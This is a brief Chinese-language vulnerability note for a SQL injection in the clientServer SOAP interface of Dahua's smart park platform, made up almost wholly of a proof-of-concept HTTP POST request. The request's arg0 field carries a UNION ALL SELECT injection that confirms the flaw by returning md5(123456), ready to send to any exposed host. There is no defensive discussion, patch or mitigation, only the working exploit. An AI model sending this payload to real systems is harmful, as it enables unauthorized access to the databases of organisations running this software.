## 大华智慧园区clientServer接口SQL注入漏洞


## poc
```
POST /portal/services/clientServer HTTP/1.1
Host:xxx
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
  <soapenv:Header/>
  <soapenv:Body>
  <cli:getGroupInfoListByGroupId>
    <!--type: string-->
      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(123456)-- -</arg0>
    <!--type: long-->
    <arg1>10</arg1>
    </cli:getGroupInfoListByGroupId>
    </soapenv:Body>
  </soap:Envelope>
```
